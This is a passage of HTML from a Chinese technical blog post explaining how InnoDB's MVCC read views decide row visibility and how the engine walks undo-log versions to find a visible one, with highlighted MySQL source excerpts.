data-line=\"crayon-5bab670167e79641856186-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-42\">42</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-1\"><span class=\"crayon-c\">/*********************************************************************/</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-2\"><span class=\"crayon-c\">Checks if a read view sees the specified transaction.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-3\"><span class=\"crayon-c\">&lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\ttrue if sees */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-4\"><span class=\"crayon-e\">UNIV_INLINE</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-5\"><span class=\"crayon-t\">bool</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-6\"><span class=\"crayon-e\">read_view_sees_trx_id</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-7\"><span class=\"crayon-c\">/*==================*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">read_view_t*</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/*!&lt; in: read view */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">trx_id_t\t\t</span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/*!&lt; in: trx id */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-10\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">up_limit_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-12\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">low_limit_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-16\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-17\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-18\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">ulint\t</span><span class=\"crayon-v\">lower</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-19\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">ulint\t</span><span class=\"crayon-v\">upper</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">n_trx_ids</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-20\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-21\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">ut_a</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">n_trx_ids</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-22\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-23\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">do</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-24\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">ulint\t\t</span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lower</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">upper</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-25\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">trx_id_t\t</span><span class=\"crayon-v\">mid_id</span><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">trx_ids</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-26\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-27\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mid_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-28\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-29\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mid_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-30\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-31\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">upper</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-32\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-33\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-34\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-35\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-36\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-v\">lower</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-37\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-38\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lower</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">upper</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-39\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-40\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670167e79641856186-41\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e79641856186-42\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0086 seconds] -->\r\n<p>其实上述函数就是一个二分法，read_view其实保存的是当前活跃事务的所有事务id,如果当前行版本对应修改的事务id不在当前活跃事务里面的话，就返回true,表示当前版本可见，否则就是不可见,如下图所示。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/acb82b909457b6ae5085767e56d9b835.png\" alt=\"\"><br>\n接上述lock_clust_rec_cons_read_sees的返回:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e7d812659341\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif (UNIV_LIKELY(srv_force_recovery &lt; 5)\r\n\t\t\t    &amp;&amp; !lock_clust_rec_cons_read_sees(\r\n\t\t\t\t    rec, index, offsets, trx-&gt;read_view)){\r\n\t// 当前处理的是当前版本不可见的情况\r\n\t// 通过undolog来返回到一致的可见版本\r\n\terr = row_sel_build_prev_vers_for_mysql(\r\n\t\t\t\t\ttrx-&gt;read_view, clust_index,\r\n\t\t\t\t\tprebuilt, rec, &amp;offsets, &amp;heap,\r\n\t\t\t\t\t&amp;old_vers, &amp;mtr);\t\t\t    \r\n} else{\r\n\t// 可见，然后返回\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e7d812659341-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e7d812659341-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">UNIV_LIKELY</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">srv_force_recovery</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-2\"><span class=\"crayon-h\">\t\t\t    </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">lock_clust_rec_cons_read_sees</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-3\"><span class=\"crayon-h\">\t\t\t\t    </span><span class=\"crayon-v\">rec</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_view</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 当前处理的是当前版本不可见的情况</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 通过undolog来返回到一致的可见版本</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row_sel_build_prev_vers_for_mysql</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-7\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">trx</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_view</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">clust_index</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-8\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">prebuilt</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rec</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">heap</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-9\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">old_vers</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">mtr</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">\t\t\t    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-10\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e7d812659341-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 可见，然后返回</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e7d812659341-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0038 seconds] -->\r\n<p></p>\n<h2>undolog搜索可见版本的过程</h2>\n<p>我们现在考察一下row_sel_build_prev_vers_for_mysql函数:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e81701261362\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrow_sel_build_prev_vers_for_mysql\r\n |-row_vers_build_for_consistent_read\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e81701261362-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e81701261362-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e81701261362-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e81701261362-1\"><span class=\"crayon-v\">row_sel_build_prev_vers_for_mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e81701261362-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">row_vers_build_for_consistent</span><span class=\"crayon-sy\">_</span>read</div><div class=\"crayon-line\" id=\"crayon-5bab670167e81701261362-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>主要是调用了row_ver_build_for_consistent_read方法返回可见版本:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e84993350332\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndberr_t row_vers_build_for_consistent_read(...)\r\n{\r\n\t......\r\n\tfor(;;){\r\n\t\terr = trx_undo_prev_version_build(rec, mtr,version,index,*offsets, heap,&amp;prev_version);\r\n\t\t......\r\n\t\ttrx_id = row_get_rec_trx_id(prev_version, index, *offsets);\r\n\t\t// 如果当前row版本符合一致性视图，则返回\r\n\t\tif (read_view_sees_trx_id(view, trx_id)) {\r\n\t\t\t......\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t// 如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方)\r\n\t\tversion = prev_version;\r\n\t}\r\n\t......\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e84993350332-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e84993350332-15\">15</div><div class=\"crayon-num crayon-striped-num\" 